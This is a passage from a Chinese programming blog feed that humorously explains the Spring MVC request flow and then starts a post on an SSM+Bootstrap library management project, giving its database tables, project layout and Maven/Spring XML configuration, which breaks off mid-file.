这个login是jsp文件名，也就是自己写的小页面。而model带的list数据将会传递给login这个页面)。</li><li>DIspatcherServlet调用视图解析器(ViewResolver)来解析HandlerAdapter传递的逻辑视图名。说人话就是，DIspatcherServlet调用了一个小弟，这个小弟是用来拼接url的。在上述的Spring-mvc.xml文件中，你可以在<bean>标签中找到这个小弟。它有两个属性，一个是prefix，另一个是suffix。字面意思理解一下，pre-前面，fix-修复。所以它就是”修复残缺的url”的工具。prefix修复前缀，suffix修复后缀。比如，DIspatcherServlet拿来刚才HandlerAdapter传递的逻辑视图名传递的”login”，把”login”送给小弟(ViewResolver)去修复一下url(拼接url)。拼接好了之后，按照如上的bean配置，得到的url即为：/WEB-INF/jsp/login.jsp。小弟搞好了之后再把它交给大哥DIspatcherServlet。</li><li>DIspatcherServlet根据视图解析器解析的视图结果，调用具体的视图。收到了修补后的url，DIspatcherServlet根据这个url帮我们进行了网页的跳转。所谓的呈现具体视图，就是网页~</li></ol><ul><li>解释1、2、3、4、5、6：</li></ul><ol><li>用户通过发起了请求：”喂！服务器！你TM的醒醒！我要去你那儿访问个东西！url是:”localhost:8080/SpringMVC/hello”，你最好赶快帮我找！”。</li><li>服务器一看：”8080，这不就是老子的地址嘛！SpringMVC，这不是我罩着的web文件夹吗！文件夹里面都是web的东西，什么jsp啦，css，什么的。我再仔细定睛一看，你TM的这个小用户，原来是想找hello这个Controller来帮你做事情啊！”</li><li>这个时候呢，DIspatcherServlet这个大哥就让HandlerMapping这个东西根据用户发来的url查找对应的handler。handler去找到底有没有用户想找的controller(hello)。找到了就返回给DIspatcherServlet，然后DIspatcherServlet大哥再通过HandlerAdapter来调用Controller。</li></ol><ul><li>整合解释：</li></ul><ol><li>老王想去p站看小电影，他之前不满于平民的视频清晰度，为此老王充了会员。现在尊贵的会员要登录p站看小电影了。他在输入框内敲下了奢华的账号与密码，点击”登录”！</li><li>就在这个平平无奇的点击登录操作背后，后端上演的是一场狂风暴雨与惊涛骇浪。当然了，它也蕴藏着无数程序员的夜不能寐和他们所剩无几的几根倔强与坚强。</li><li>在前端input标签内，action属性剑指请求，method里面是卑微的请求方法(毕竟要跟服务器大哥说话，还是放尊重点用个post吧！)。当尊贵的小王点击登录按钮后，前端的submit脑海中一阵电流钻过，请求发过去了。</li><li>服务器大哥(DIspatcherServlet)看到了请求，”localhost:8080/SpringMVC/hello”。这个请求曾原模原样的写在action里面。服务器大哥(DIspatcherServlet)开始分析用户的请求了:”emm…8080是我，Tomcat本尊所在的地址(这地址其实是开发者分给我的，我多么想在8488端口啊，如果有的话…！就是没这王者的命啊！)。而SpringMVC是本服务器下面的一个文件夹，里面是开发者曾部署给我的web文件，等会我的操作还得靠里面的文件嘞！！至于hello嘛，是用户想找的Controller，用它来实现某种功能！”。服务器大哥分析完了之后，就把这种事交给手下的小弟去做了。大哥吆喝了几个小弟，他们是HandlerMapping、HandlerAdapter、ViewResolver。这些小弟开始干活了，小弟们实现了各种操作，他们要做的就是把做完的事报告给大哥，然后让大哥在顶层做决策。守得云开见月明，大哥看到所有操作都over了，就返给了用户一个结果。</li><li>老王一看，我擦，密码错误！？重新输入密码，还是不对！TMD，你知不知道反复做这种操作后端都经历了什么啊！老王瘫在椅子上，好家伙，自己花了999软妹币充值的十年vip账号让别人盗了！事后老王惆怅不已，在家书里写下了这样一段话:”吾子孙，万不可玩p站。”</li></ol><p><strong>厘清一些误解：</strong></p><p>上述url中的地址，并不是web站点的目录，它实际上是在通过Controller来访问web站点的资源。这一点很牛逼哦！因为你无法直接通过目录形式访问得到web资源，你得经过Controller！否则，想登录p站，门都没有。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 项目实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web开发 </tag>
            
            <tag> 框架 </tag>
            
            <tag> SpringMVC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于SSM+BootStrap的图书管理项目</title>
      <link href="/2021/06/12/%E5%9F%BA%E4%BA%8ESSM-BootStrap%E7%9A%84%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E9%A1%B9%E7%9B%AE/"/>
      <url>/2021/06/12/%E5%9F%BA%E4%BA%8ESSM-BootStrap%E7%9A%84%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="项目工具"><a href="#项目工具" class="headerlink" title="项目工具"></a>项目工具</h2><ul><li>IDEA 2021.1</li><li>Mybatis 3.5.2</li><li>maven 3.6.1</li><li>Tomcat 8.0</li><li>spring-webmvc 5.1.9</li><li>更多请见下方核心配置</li></ul><h2 id="项目数据库设计"><a href="#项目数据库设计" class="headerlink" title="项目数据库设计"></a>项目数据库设计</h2><table><thead><tr><th align="left">表</th><th>主键</th></tr></thead><tbody><tr><td align="left">admin</td><td>admin_id</td></tr><tr><td align="left">class_info</td><td>class_id</td></tr><tr><td align="left">book_info</td><td>book_id</td></tr><tr><td align="left">lend_list</td><td>ser_num</td></tr><tr><td align="left">reader_card</td><td>reader_id</td></tr><tr><td align="left">reader_info</td><td>reader_id</td></tr></tbody></table><h3 id="admin表"><a href="#admin表" class="headerlink" title="admin表"></a>admin表</h3><table><thead><tr><th>名字</th><th>数据类型</th></tr></thead><tbody><tr><td>admin_id</td><td>bigint</td></tr><tr><td>password</td><td>varchar(15)</td></tr><tr><td>username</td><td>varchar(15)</td></tr></tbody></table><h3 id="class-info-表"><a href="#class-info-表" class="headerlink" title="class_info 表"></a>class_info 表</h3><table><thead><tr><th>名字</th><th>数据类型</th></tr></thead><tbody><tr><td>class_id</td><td>int</td></tr><tr><td>class_name</td><td>varchar(15)</td></tr></tbody></table><h3 id="book-info表"><a href="#book-info表" class="headerlink" title="book_info表"></a>book_info表</h3><table><thead><tr><th>名字</th><th>数据类型</th></tr></thead><tbody><tr><td>book_id</td><td>bigint(auto increment)</td></tr><tr><td>name</td><td>varchar(20)</td></tr><tr><td>author</td><td>varchar(15)</td></tr><tr><td>publish</td><td>varchar(20)</td></tr><tr><td>ISBN</td><td>varchar(15)</td></tr><tr><td>introduction</td><td>text</td></tr><tr><td>language</td><td>varchar(4)</td></tr><tr><td>price</td><td>decimal(10,2)</td></tr><tr><td>pub_date</td><td>date</td></tr><tr><td>class_id</td><td>int</td></tr><tr><td>number</td><td>int</td></tr></tbody></table><h3 id="lend-list表"><a href="#lend-list表" class="headerlink" title="lend_list表"></a>lend_list表</h3><table><thead><tr><th>名字</th><th>数据类型</th></tr></thead><tbody><tr><td>ser_num</td><td>bigint</td></tr><tr><td>book_id</td><td>bigint</td></tr><tr><td>reader_id</td><td>bigint</td></tr><tr><td>lend_date</td><td>date</td></tr><tr><td>back_date</td><td>date</td></tr></tbody></table><h3 id="reader-card表"><a href="#reader-card表" class="headerlink" title="reader_card表"></a>reader_card表</h3><table><thead><tr><th>名字</th><th>数据类型</th></tr></thead><tbody><tr><td>reader_id</td><td>bigint</td></tr><tr><td>username</td><td>varchar(15)</td></tr><tr><td>password</td><td>varchar(15)</td></tr></tbody></table><h3 id="reader-info表"><a href="#reader-info表" class="headerlink" title="reader_info表"></a>reader_info表</h3><table><thead><tr><th>名字</th><th>数据类型</th></tr></thead><tbody><tr><td>reader_id</td><td>bigint(auto increment)</td></tr><tr><td>name</td><td>varchar(10)</td></tr><tr><td>sex</td><td>varchar(2)</td></tr><tr><td>birth</td><td>date</td></tr><tr><td>address</td><td>varchar(50)</td></tr><tr><td>phone</td><td>varchar(15)</td></tr></tbody></table><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><ul><li>Java<ul><li>controller</li><li>Mapper</li><li>pojo</li><li>service</li></ul></li><li>resources<ul><li>applicationContext.xml</li><li>database.properties</li><li>mybatis-config.xml</li><li>spring-dao.xml</li><li>spring-mvc.xml</li><li>spring-service.xml</li></ul></li><li>web<ul><li>css</li><li>fonts</li><li>js</li><li>images</li><li>WEB-INF</li></ul></li></ul><p>注解：web中的css、fonts、js文件为BootStrap文件，用于前端。</p><h2 id="项目结构原理"><a href="#项目结构原理" class="headerlink" title="项目结构原理"></a>项目结构原理</h2><p>一张图说清楚：</p><p><img src="/images/JavaScript/SpringMVC%E6%B5%81%E7%A8%8B%E5%9B%BE.png"></p><blockquote><p>图片源自狂神说微信公众号</p></blockquote><h2 id="核心配置"><a href="#核心配置" class="headerlink" title="核心配置"></a>核心配置</h2><h3 id="一些题外话"><a href="#一些题外话" class="headerlink" title="一些题外话"></a>一些题外话</h3><p>在学Spring的时候，有人说这是配置地狱，起初我还不以为意，直到亲手做项目，才感受到什么叫不听老人言，吃亏在眼前。</p><p>为了让自己以后不再吃配置的苦，我将把配置源文件的代码放在这里。</p><h3 id="发车了"><a href="#发车了" class="headerlink" title="发车了"></a>发车了</h3><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><span class="hljs-comment">&lt;!--Your project--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.hu<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ssm_build_book<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--Junit--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--数据库驱动--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.47<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 数据库连接池 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mchange<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>c3p0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.5.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!--Servlet - JSP --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--lombok--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.16.10<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jsp-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jstl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!--Mybatis--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!--Spring--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-webmvc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.9.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-jdbc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.9.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>src/main/java<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">includes</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.properties<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.xml<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">includes</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">filtering</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">filtering</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>src/main/resources<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">includes</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.properties<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.xml<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">includes</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">filtering</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">filtering</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p>spring-service.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-tag"><span class="hljs-string">       http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!--scan service--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.hu.service&quot;</span>/&gt;</span><br><br>    <span class="hljs-comment">&lt;!--service class added into Spring--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;BooksServicelmpl&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.hu.service.BooksServicelmpl&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bookMapper&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;bookMapper&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;adminServicelmpl&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.hu.service.adminServicelmpl&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;adminMapper&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;adminMapper&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!--Declare thing configuration--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;transactionManager&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--add data source--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dataSource&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;dataSource&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--aop--&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>spring-mvc.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:mvc</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-tag"><span class="hljs-string">   http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="hljs-tag"><span class="hljs-string">   http://www.springframework.org/schema/context</span></span><br><span class="hljs-tag"><span class="hljs-string">   http://www.springframework.org/schema/context/spring-context.xsd</span></span><br><span class="hljs-tag"><span class="hljs-string">   http://www.springframework.org/schema/mvc</span></span><br><span class="hljs-tag"><span class="hljs-string">   https://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--1.note driver--&gt;</span><br>    <span class="hljs-tag">&lt;<span 